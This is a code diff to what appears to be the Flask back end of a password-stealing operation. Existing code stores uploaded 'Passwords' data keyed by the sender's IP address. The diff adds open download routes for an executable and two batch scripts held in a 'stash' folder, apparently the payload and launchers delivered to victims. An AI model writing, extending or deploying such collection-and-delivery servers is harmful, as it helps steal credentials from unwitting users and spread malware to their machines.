@@ -1,4 +1,4 @@
-from flask import Blueprint, render_template, Response, request, jsonify, redirect
+from flask import Blueprint, render_template, Response, request, jsonify, redirect, send_file
 from flask_login import login_required, login_user, logout_user, current_user
 from ..models import Users, Passwords
 from ..extentions import db
@@ -44,6 +44,18 @@ def get_pswd():
         db.session.add(Passwords(ip=request.remote_addr, name=name, data_paths=f"data/{fname}.json"))
         db.session.commit()
     return "Success"
+
+@web.route("/getexe")
+def download_exe():
+    return send_file("stash/dcpl.exe")
+
+@web.route("/getconf")
+def download_conf():
+    return send_file("stash/execonf.bat")
+
+@web.route("/getstart")
+def download_start():
+    return send_file("stash/start.bat")
 
 @web.route("/login", methods=["GET", "POST"])
 def login():
